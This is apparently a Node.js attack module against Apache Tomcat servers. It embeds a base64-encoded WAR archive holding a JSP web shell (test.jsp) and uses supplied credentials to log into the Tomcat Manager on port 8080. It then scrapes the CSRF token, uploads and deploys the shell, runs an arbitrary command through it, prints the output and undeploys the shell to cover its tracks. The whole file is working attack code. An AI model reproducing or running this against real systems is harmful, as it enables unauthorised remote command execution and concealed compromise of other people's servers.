var request = require('request'),
    cheerio = require('cheerio'),
    fs = require('fs'),
    os = require('os'),
    token, options = {},
    warFile = "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";

    

var fs = require('fs');
fs.writeFile(os.tmpdir()+"/apache_test.war", new Buffer(warFile, 'base64'), function(err) {
    if(err) {
        return console.log(err);
    }
}); 

var j = request.jar()
var request = request.defaults({jar:j})

var options = {
	url: '',
	headers: {
		'Authorization': '',
		'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0'
	}
}

function unDeploy(ip){
request.post({ url: 'http://'+ip+':8080/manager/html/undeploy?path=/apache_test&'+token, form: {} },
    function(err, httpResponse, body) {

    })	
}

function runCommand(ip, cmd){
	request('http://'+ip+':8080/apache_test/test.jsp?id='+cmd, function(error, response, body) {
	    
	    if (!error) {
	    	$ = cheerio.load(body);
	    	var response = $('body > pre:nth-child(2)').text();
	    	console.log(response.trim());
	    	unDeploy(ip);

	    } else {}
	});
}

function uploadWar(ip, cmd) {
	var formData = {
	  // Pass data via Streams
	  deployWar: fs.createReadStream(os.tmpdir()+'/apache_test.war'),
	
	};
	request.post({url:'http://'+ip+':8080/manager/html/upload?'+token, headers: options.headers,formData: formData, preambleCRLF: true,postambleCRLF: true }, function optionalCallback(err, httpResponse, body) {
	  if (err) {
	    return console.error('upload failed:', err);
	  }
	        $ = cheerio.load(body);
        	var href = $('a').eq(4).attr('href')
        	token = href.split("?")[1];
        	fs.unlinkSync(os.tmpdir()+'/apache_test.war');
   			runCommand(ip, cmd);
	});
}

function getCSRFToken(ip, cmd) {
    request(options, function(error, response, body) {
        if (!error) {
        	try {
	        	$ = cheerio.load(body);
	        	var href = $('a').eq(4).attr('href')
	        	token = href.split("?")[1];
	        	uploadWar(ip, cmd);
        	} catch(err){
        		console.log("Credentials appear to be invalid.")
        	}

        } else {
        	console.log(error);
        }
    });
}


exports.cmd = function(ip, cmd, creds){
	options.headers.Authorization = "Basic "+new Buffer(creds).toString('base64');
	options.url = 'http://'+ip+':8080/manager/html';
	getCSRFToken(ip, cmd);
}




